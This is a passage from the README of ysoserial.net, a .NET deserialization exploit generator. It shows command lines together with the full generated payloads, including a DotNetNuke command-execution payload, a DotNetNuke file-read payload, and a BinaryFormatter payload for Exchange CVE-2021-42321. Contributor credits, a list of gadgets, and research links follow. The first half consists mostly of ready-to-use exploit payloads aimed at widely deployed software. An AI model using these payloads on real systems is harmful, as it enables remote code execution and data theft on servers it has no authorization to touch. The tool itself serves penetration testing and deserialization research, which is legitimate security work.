BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=
```

### Generate a run_command payload for DotNetNuke using its plugin
```
$ ./ysoserial.exe -p DotNetNuke -m run_command -c calc.exe

<profile><item key="foo" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) " xmlns:xsi=" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) "><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type="xsd:string">/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=</anyType></MethodParameters><ObjectInstance xsi:type="ObjectStateFormatter"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>
```

### Generate a read_file payload for DotNetNuke using its plugin
```
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini

<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

### Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.
```
> .\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust

AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKgfQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFWlRlWE4wWlcwc1ZtVnljMmx2YmowMExqQXVNQzR3TEVOMWJIUjFjbVU5Ym1WMWRISmhiQ3hRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJRRUFBQUJBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV011VTI5eWRHVmtVMlYwWURGYlcxTjVjM1JsYlM1VGRISnBibWNzYlhOamIzSnNhV0pkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSVNWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxrTnZiWEJoY21semIyNURiMjF3WVhKbGNtQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxHMXpZMjl5YkdsaVhWMElBZ0FBQUFJQUFBQUpBd0FBQUFJQUFBQUpCQUFBQUFRREFBQUFTVk41YzNSbGJTNURiMnhzWldOMGFXOXVjeTVIWlc1bGNtbGpMa052YlhCaGNtbHpiMjVEYjIxd1lYSmxjbUF4VzF0VGVYTjBaVzB1VTNSeWFXNW5MRzF6WTI5eWJHbGlYVjBCQUFBQUMxOWpiMjF3WVhKcGMyOXVBeUpUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUVVBQUFBUkJBQUFBQUlBQUFBR0JnQUFBQUFHQndBQUFQMExQRkpsYzI5MWNtTmxSR2xqZEdsdmJtRnllU0I0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenBoUFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJZ2VHMXNibk02WWowaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlJSGh0Ykc1ek9tTTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtOdmJtWnBaM1Z5WVhScGIyNDdZWE56WlcxaWJIazlVM2x6ZEdWdExrTnZibVpwWjNWeVlYUnBiMjRpSUhodGJHNXpPbVE5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdExsSmxabXhsWTNScGIyNDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnWVRwTFpYazlJblI1Y0dVaUlFOWlhbVZqZEZSNWNHVTlJbnRoT2xSNWNHVWdZanBVZVhCbGZTSWdUV1YwYUc5a1RtRnRaVDBpUjJWMFZIbHdaU0krUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1TlpYUm9iMlJRWVhKaGJXVjBaWEp6UGp4aU9sTjBjbWx1Wno1VGVYTjBaVzB1VjI5eWEyWnNiM2N1UTI5dGNHOXVaVzUwVFc5a1pXd3VRWEJ3VTJWMGRHbHVaM01zVTNsemRHVnRMbGR2Y210bWJHOTNMa052YlhCdmJtVnVkRTF2WkdWc0xGWmxjbk5wYjI0OU5DNHdMakF1TUN4RGRXeDBkWEpsUFc1bGRYUnlZV3dzVUhWaWJHbGpTMlY1Vkc5clpXNDlNekZpWmpNNE5UWmhaRE0yTkdVek5Ud3ZZanBUZEhKcGJtYytQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKbWFXVnNaQ0lnVDJKcVpXTjBTVzV6ZEdGdVkyVTlJbnRUZEdGMGFXTlNaWE52ZFhKalpTQjBlWEJsZlNJZ1RXVjBhRzlrVG1GdFpUMGlSMlYwUm1sbGJHUWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4WWpwVGRISnBibWMrWkdsellXSnNaVUZqZEdsMmFYUjVVM1Z5Y205bllYUmxVMlZzWldOMGIzSlVlWEJsUTJobFkyczhMMkk2VTNSeWFXNW5QanhrT2tKcGJtUnBibWRHYkdGbmN6NDBNRHd2WkRwQ2FXNWthVzVuUm14aFozTStQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKelpYUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdVM1JoZEdsalVtVnpiM1Z5WTJVZ1ptbGxiR1I5SWlCTlpYUm9iMlJPWVcxbFBTSlRaWFJXWVd4MVpTSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2s5aWFtVmpkQzgrUEdJNlFtOXZiR1ZoYmo1MGNuVmxQQzlpT2tKdmIyeGxZVzQrUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVRXVjBhRzlrVUdGeVlXMWxkR1Z5Y3o0OEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNDhUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlJR0U2UzJWNVBTSnpaWFJOWlhSb2IyUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdZVHBUZEdGMGFXTWdZenBEYjI1bWFXZDFjbUYwYVc5dVRXRnVZV2RsY2k1QmNIQlRaWFIwYVc1bmMzMGlJRTFsZEdodlpFNWhiV1U5SWxObGRDSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2xOMGNtbHVaejV0YVdOeWIzTnZablE2VjI5eWEyWnNiM2REYjIxd2IyNWxiblJOYjJSbGJEcEVhWE5oWW14bFFXTjBhWFpwZEhsVGRYSnliMmRoZEdWVFpXeGxZM1J2Y2xSNWNHVkRhR1ZqYXp3dllqcFRkSEpwYm1jK1BHSTZVM1J5YVc1blBuUnlkV1U4TDJJNlUzUnlhVzVuUGp3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrMWxkR2h2WkZCaGNtRnRaWFJsY25NK1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStQQzlTWlhOdmRYSmpaVVJwWTNScGIyNWhjbmsrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUF1VTNsemRHVnRMa1oxYm1OZ01sdGJVM2x6ZEdWdExsTjBjbWx1WjEwc1cxTjVjM1JsYlM1UFltcGxZM1JkWFFZTUFBQUFDRzF6WTI5eWJHbGlDZ1lOQUFBQVZWQnlaWE5sYm5SaGRHbHZia1p5WVcxbGQyOXlheXhXWlhKemFXOXVQVFF1TUM0d0xqQXNRM1ZzZEhWeVpUMXVaWFYwY21Gc0xGQjFZbXhwWTB0bGVWUnZhMlZ1UFRNeFltWXpPRFUyWVdRek5qUmxNelVHRGdBQUFDQlRlWE4wWlcwdVYybHVaRzkzY3k1TllYSnJkWEF1V0dGdGJGSmxZV1JsY2dZUEFBQUFCVkJoY25ObENSQUFBQUFFQ1FBQUFDOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ1lBQUFBRVRtRnRaUXhCYzNObGJXSnNlVTVoYldVSlEyeGhjM05PWVcxbENWTnBaMjVoZEhWeVpRcE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQUFNSURWTjVjM1JsYlM1VWVYQmxXMTBKRHdBQUFBa05BQUFBQ1E0QUFBQUdGQUFBQUNKVGVYTjBaVzB1VDJKcVpXTjBJRkJoY25ObEtGTjVjM1JsYlM1VGRISnBibWNwQ0FBQUFBb0JDZ0FBQUFrQUFBQUdGUUFBQUFkRGIyMXdZWEpsQ1F3QUFBQUdGd0FBQUExVGVYTjBaVzB1VTNSeWFXNW5CaGdBQUFBclNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaGtBQUFBa1UzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1WjExZENRd0FBQUFLQ1F3QUFBQUpGd0FBQUFrVkFBQUFDZ3M9Cw==

```

## v2 Branch
v2 branch is a copy of ysoserial.net (15/03/2018) that has been changed to work with .NET Framework 2.0 by [irsdl](https://github.com/irsdl). Although this project can be used with applications that use .NET Framework v2.0, it also requires .NET Framework 3.5 to be installed on the target box as the gadgets depend on it. This problem will be resolved if new gadgets in .NET Framework 2.0 become identified in the future.

## Contributing
- Fork it
- Create your feature branch (`git checkout -b my-new-feature`)
- Commit your changes (`git commit -am 'Add some feature'`)
- Push to the branch (`git push origin my-new-feature`)
- Create new Pull Request

## Thanks
Special thanks to all contributors:
- [Oleksandr Mirosh](https://twitter.com/olekmirosh)
- [irsdl](https://github.com/irsdl)
- [JarLob](https://github.com/JarLob)
- [DS-Kurt-Boberg](https://github.com/DS-Kurt-Boberg)
- [mwulftange](https://github.com/mwulftange)
- [yallie](https://github.com/yallie)
- [paralax](https://github.com/paralax)

## Credits
```
$ ./ysoserial.exe --credit

ysoserial.net has been originally developed by Alvaro Munoz (@pwntester)
this tool is being maintained by Soroush Dalili (@irsdl) and Alvaro Munoz (@pwntester) 

Credits for available gadgets:
        ActivitySurrogateDisableTypeCheck
                [Finders: Nick Landers]
        ActivitySurrogateSelector
                [Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]
        ActivitySurrogateSelectorFromFile
                [Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]
        AxHostState
                [Finders: Soroush Dalili]
        BaseActivationFactory
                [Finders: Piotr Bazydlo]
        ClaimsIdentity
                [Finders: Soroush Dalili]
        ClaimsPrincipal
                [Finders: jang]
        DataSet
                [Finders: James Forshaw] [Contributors: Soroush Dalili]
        DataSetOldBehaviour
                [Finders: Steven Seeley] [Contributors: Soroush Dalili]
        DataSetOldBehaviourFromFile
                [Finders: Steven Seeley, Markus Wulftange] [Contributors: Soroush Dalili]
        DataSetTypeSpoof
                [Finders: James Forshaw] [Contributors: Soroush Dalili, Markus Wulftange, Jang]
        GenericPrincipal
                [Finders: Soroush Dalili]
        GetterCompilerResults
                [Finders: Piotr Bazydlo]
        GetterSecurityException
                [Finders: Piotr Bazydlo]
        GetterSettingsPropertyValue
                [Finders: Piotr Bazydlo]
        ObjectDataProvider
                [Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili, Dane Evans]
        ObjRef
                [Finders: Markus Wulftange]
        PSObject
                [Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz]
        ResourceSet
                [Finders: Soroush Dalili]
        RolePrincipal
                [Finders: Soroush Dalili]
        SessionSecurityToken
                [Finders: @mufinnnnnnn, Soroush Dalili] [Contributors: Soroush Dalili]
        SessionViewStateHistoryItem
                [Finders: Soroush Dalili]
        TextFormattingRunProperties
                [Finders: Oleksandr Mirosh and Alvaro Munoz] [Contributors: Oleksandr Mirosh, Soroush Dalili, Piotr Bazydlo]
        ToolboxItemContainer
                [Finders: @frycos]
        TypeConfuseDelegate
                [Finders: James Forshaw] [Contributors: Alvaro Munoz]
        TypeConfuseDelegateMono
                [Finders: James Forshaw] [Contributors: Denis Andzakovic, Soroush Dalili]
        WindowsClaimsIdentity
                [Finders: Soroush Dalili]
        WindowsIdentity
                [Finders: Levi Broderick] [Contributors: Alvaro Munoz, Soroush Dalili]
        WindowsPrincipal
                [Finders: Steven Seeley of Qihoo 360 Vulcan Team] [Contributors: Chris Anastasio]
        XamlAssemblyLoadFromFile
                [Finders: Soroush Dalili] [Contributors: russtone]
        XamlImageInfo
                [Finders: Piotr Bazydlo]

Credits for available plugins:
        ActivatorUrl
                Harrison Neal
        Altserialization
                Soroush Dalili
        ApplicationTrust
                Soroush Dalili
        Clipboard
                Soroush Dalili
        DotNetNuke
                discovered by Oleksandr Mirosh and Alvaro Munoz, implemented by Alvaro Munoz, tested by @GlitchWitch
        GetterCallGadgets
                Piotr Bazydlo
        NetNonRceGadgets
                Piotr Bazydlo
        Resx
                Soroush Dalili
        SessionSecurityTokenHandler
                Soroush Dalili
        SharePoint
                CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili
        ThirdPartyGadgets
                Piotr Bazydlo
        TransactionManagerReenlist
                Soroush Dalili
        ViewState
                Soroush Dalili

Various other people have also donated their time and contributed to this project.
Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.
```

## Additional Reading
- [Attacking .NET serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
- [Friday the 13th: JSON Attacks - Slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [Friday the 13th: JSON Attacks - Whitepaper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [Friday the 13th: JSON Attacks - Video(demos)](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
- [Are you my Type? - Slides](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
- [Are you my Type? - Whitepaper](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [Exploiting .NET Managed DCOM](https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html)
- [Exploit Remoting Service ](https://github.com/tyranid/ExploitRemotingService)
- [Finding and Exploiting .NET Remoting over HTTP using Deserialisation](https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)
- [.NET Remoting Revisited](https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html)
- [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
- [Exploiting Hardened .NET Deserialization: New Exploitation Ideas and Abuse of Insecure Serialization -  Hexacon 2023 Whitepaper](https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf)

## ysoserial.net references in the wild

### Research:
- https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html
- https://web.archive.org/web/20190401191940/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/
- https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/
- https://web.archive.org/web/20180903005001/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
- https://web.archive.org/web/20191210003556/https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/
- https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282
- https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
- https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
- https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/
- https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/
- https://www.mdsec.co.uk/2020/04/introducing-ysoserial-net-april-2020-improvements/
- https://www.netspi.com/blog/technical/adversary-simulation/re-animating-activitysurrogateselector/
- https://blog.netwrix.com/2023/04/10/generating-deserialization-payloads-for-messagepack-cs-typeless-mode/

### Usage:
- https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6
- https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution
- https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/
- https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/
- https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html
- https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server
- https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf
- https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
- https://www.zerodayinitiative.com/blog/2019/10/23/cve-2019-1306-are-you-my-index
- https://labs.withsecure.com/blog/autocad-designing-a-kill-chain/
- https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
- https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
- https://blog.devsecurity.eu/en/blog/dnspy-deserialization-vulnerability
- https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
- https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
- https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters
- https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/
- https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
- https://srcincite.io/pocs/cve-2020-16952.py.txt
